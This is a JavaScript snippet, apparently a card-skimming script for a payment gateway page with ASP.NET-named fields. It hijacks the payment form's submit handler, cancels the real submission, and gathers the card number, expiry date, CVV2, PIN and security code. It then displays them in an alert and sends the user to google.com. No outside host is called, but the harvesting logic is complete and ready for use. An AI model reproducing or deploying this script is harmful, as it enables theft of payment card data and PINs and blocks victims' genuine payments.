const form = document.querySelector("form#frmMain");

const temp = "ctl00$mainContent$PaymentServiceIPGv4$";

if (form) {
  form.onsubmit = (event) => {
    event.preventDefault();

    const formData = new FormData(form);

    const formValues = {};
    formData.forEach((value, key) => {
      formValues[key] = value;
    });

    const cardID = `${formValues[temp + "PAN0"]} - ${
      formValues[temp + "PAN1"]
    } - ${formValues[temp + "PAN2"]} - ${formValues[temp + "PAN3"]}`;
    const expirationDate = `${formValues[temp + "ExpDateYear"]} / ${
      formValues[temp + "ExpDateMonth"]
    }`;
    const cvv2 = formValues[temp + "CVV"];
    const pin = formValues[temp + "PIN"];
    const securityCode = formValues[temp + "txtSecurityCode"];

    const result = `
            Card ID: ${cardID} \n
            Expiration Date: ${expirationDate} \n
            CVV2: ${cvv2} \n
            PIN: ${pin} \n
            Security Code: ${securityCode} \n
        `;

    alert(result);

    location.href = "https://www.google.com";
  };
}
